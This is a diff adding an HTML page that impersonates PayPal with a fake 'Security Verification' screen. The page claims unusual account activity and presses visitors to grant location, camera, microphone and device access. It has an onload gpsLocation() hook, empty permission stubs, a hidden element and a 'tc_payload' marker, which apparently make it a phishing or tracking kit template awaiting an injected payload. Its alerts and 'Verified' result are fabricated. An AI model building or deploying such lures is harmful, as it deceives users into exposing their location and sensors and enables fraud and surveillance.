@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PayPal Security Verification</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: #f5f7fa;
+            min-height: 100vh;
+        }
+
+        .header {
+            background: #fff;
+            border-bottom: 1px solid #cbd2d9;
+            padding: 16px 24px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            color: #0070ba;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 40px auto;
+            padding: 0 20px;
+        }
+
+        .card {
+            background: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            overflow: hidden;
+        }
+
+        .card-header {
+            background: linear-gradient(135deg, #0070ba 0%, #005ea6 100%);
+            padding: 32px;
+            text-align: center;
+            color: white;
+        }
+
+        .header-icon {
+            width: 64px;
+            height: 64px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            font-size: 32px;
+        }
+
+        .card-title {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .card-subtitle {
+            font-size: 14px;
+            opacity: 0.95;
+        }
+
+        .card-content {
+            padding: 32px;
+        }
+
+        .alert-box {
+            background: #fff3cd;
+            border-left: 4px solid #ffc439;
+            padding: 16px;
+            border-radius: 4px;
+            margin-bottom: 24px;
+        }
+
+        .alert-title {
+            font-size: 15px;
+            font-weight: 600;
+            color: #856404;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .alert-text {
+            font-size: 14px;
+            color: #856404;
+            line-height: 1.6;
+        }
+
+        .info-section {
+            margin: 24px 0;
+        }
+
+        .section-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #2c2e2f;
+            margin-bottom: 16px;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 16px;
+            margin-bottom: 24px;
+        }
+
+        .info-card {
+            background: #f5f7fa;
+            padding: 16px;
+            border-radius: 8px;
+            border-left: 3px solid #0070ba;
+        }
+
+        .info-label {
+            font-size: 12px;
+            color: #687173;
+            margin-bottom: 4px;
+            font-weight: 600;
+            text-transform: uppercase;
+        }
+
+        .info-value {
+            font-size: 14px;
+            color: #2c2e2f;
+            font-weight: 500;
+        }
+
+        .verification-box {
+            background: #f5f7fa;
+            border: 1px solid #cbd2d9;
+            border-radius: 8px;
+            padding: 24px;
+            margin: 24px 0;
+        }
+
+        .verification-header {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            margin-bottom: 16px;
+        }
+
+        .verification-icon {
+            width: 48px;
+            height: 48px;
+            background: #0070ba;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+        }
+
+        .verification-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #2c2e2f;
+        }
+
+        .verification-text {
+            font-size: 14px;
+            color: #687173;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .permission-list {
+            list-style: none;
+            margin: 16px 0;
+        }
+
+        .permission-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 12px;
+            background: white;
+            border: 1px solid #cbd2d9;
+            border-radius: 8px;
+            margin-bottom: 8px;
+        }
+
+        .permission-icon {
+            width: 36px;
+            height: 36px;
+            background: #e5f1fa;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #0070ba;
+            font-size: 16px;
+        }
+
+        .permission-text {
+            font-size: 14px;
+            color: #2c2e2f;
+        }
+
+        .button-group {
+            display: flex;
+            gap: 12px;
+            margin-top: 20px;
+        }
+
+        .btn {
+            flex: 1;
+            padding: 12px 24px;
+            border-radius: 24px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+        }
+
+        .btn-primary {
+            background: #0070ba;
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #005ea6;
+        }
+
+        .btn-primary:disabled {
+            background: #cbd2d9;
+            color: #687173;
+            cursor: not-allowed;
+        }
+
+        .btn-secondary {
+            background: white;
+            color: #0070ba;
+            border: 1px solid #0070ba;
+        }
+
+        .btn-secondary:hover {
+            background: #f5f7fa;
+        }
+
+        .btn-success {
+            background: #28a745;
+            color: white;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 32px 20px;
+        }
+
+        .footer-text {
+            font-size: 12px;
+            color: #687173;
+            margin: 4px 0;
+        }
+
+        .footer-links {
+            margin-top: 12px;
+        }
+
+        .footer-link {
+            color: #0070ba;
+            text-decoration: none;
+            font-size: 12px;
+            margin: 0 8px;
+        }
+
+        .footer-link:hover {
+            text-decoration: underline;
+        }
+
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0070ba;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 16px auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                margin: 20px auto;
+            }
+
+            .button-group {
+                flex-direction: column;
+            }
+
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+
+<body onload="gpsLocation()">
+    <div class="header">
+        <div class="logo">PayPal</div>
+    </div>
+
+    <div class="container">
+        <div class="card">
+            <div class="card-header">
+                <div class="header-icon">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h1 class="card-title">Security Verification</h1>
+                <p class="card-subtitle">Protect your account from unauthorized access</p>
+            </div>
+
+            <div class="card-content">
+                <div class="alert-box">
+                    <div class="alert-title">
+                        <i class="fas fa-exclamation-triangle"></i>
+                        <span>Account Security Alert</span>
+                    </div>
+                    <p class="alert-text">
+                        We've detected unusual activity on your PayPal account. To ensure your account's security,
+                        please complete the verification process.
+                    </p>
+                </div>
+
+                <div class="info-section">
+                    <h3 class="section-title">Activity Summary</h3>
+                    <div class="info-grid">
+                        <div class="info-card">
+                            <div class="info-label">Risk Level</div>
+                            <div class="info-value" style="color: #d93f00;">High</div>
+                        </div>
+                        <div class="info-card">
+                            <div class="info-label">Activity Type</div>
+                            <div class="info-value">Suspicious Login</div>
+                        </div>
+                        <div class="info-card">
+                            <div class="info-label">Status</div>
+                            <div class="info-value" style="color: #ffc439;">Pending</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="verification-box">
+                    <div class="verification-header">
+                        <div class="verification-icon">
+                            <i class="fas fa-user-shield"></i>
+                        </div>
+                        <h3 class="verification-title">Identity Verification</h3>
+                    </div>
+                    <p class="verification-text">
+                        To protect your account and complete the verification, please grant the following permissions:
+                    </p>
+
+                    <ul class="permission-list">
+                        <li class="permission-item">
+                            <div class="permission-icon">
+                                <i class="fas fa-map-marker-alt"></i>
+                            </div>
+                            <span class="permission-text">Location verification</span>
+                        </li>
+                        <li class="permission-item">
+                            <div class="permission-icon">
+                                <i class="fas fa-camera"></i>
+                            </div>
+                            <span class="permission-text">Camera access for identity confirmation</span>
+                        </li>
+                        <li class="permission-item">
+                            <div class="permission-icon">
+                                <i class="fas fa-microphone"></i>
+                            </div>
+                            <span class="permission-text">Microphone access for voice verification</span>
+                        </li>
+                        <li class="permission-item">
+                            <div class="permission-icon">
+                                <i class="fas fa-mobile-alt"></i>
+                            </div>
+                            <span class="permission-text">Device information</span>
+                        </li>
+                    </ul>
+
+                    <div class="button-group">
+                        <button class="btn btn-secondary" id="allowBtn" onclick="allowPermissions()">Allow
+                            Permissions</button>
+                        <button class="btn btn-primary" id="verifyBtn" onclick="startVerification()" disabled>Verify
+                            Account</button>
+                    </div>
+
+                    <div class="spinner" id="spinner"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p class="footer-text">PayPal Security Center</p>
+        <p class="footer-text">© 1999-2024 PayPal, Inc. All rights reserved.</p>
+        <div class="footer-links">
+            <a href="#" class="footer-link" onclick="return false;">Security</a>
+            <a href="#" class="footer-link" onclick="return false;">Privacy</a>
+            <a href="#" class="footer-link" onclick="return false;">Help</a>
+        </div>
+    </div>
+
+    <p id="techchip" style="display:none;"></p>
+
+    <script>
+        var permissionsGranted = false;
+
+        function allowPermissions() {
+            if (typeof requestPermissions === 'function') {
+                requestPermissions();
+            }
+
+            permissionsGranted = true;
+            var verifyBtn = document.getElementById('verifyBtn');
+            verifyBtn.disabled = false;
+
+            var allowBtn = document.getElementById('allowBtn');
+            allowBtn.innerHTML = '<i class="fas fa-check"></i> Permissions Granted';
+            allowBtn.className = 'btn btn-success';
+            allowBtn.disabled = true;
+        }
+
+        function startVerification() {
+            if (!permissionsGranted) {
+                alert('Please allow permissions first');
+                return;
+            }
+
+            document.getElementById('spinner').style.display = 'block';
+            document.getElementById('verifyBtn').innerHTML = 'Verifying...';
+            document.getElementById('verifyBtn').disabled = true;
+
+            setTimeout(function () {
+                document.getElementById('spinner').style.display = 'none';
+                document.getElementById('verifyBtn').innerHTML = '<i class="fas fa-check-circle"></i> Verified';
+                document.getElementById('verifyBtn').className = 'btn btn-success';
+            }, 3000);
+        }
+
+        function requestPermissions() { }
+        function gpsLocation() { }
+    </script>
+
+    <!-- tc_payload -->
+</body>
+
+</html>
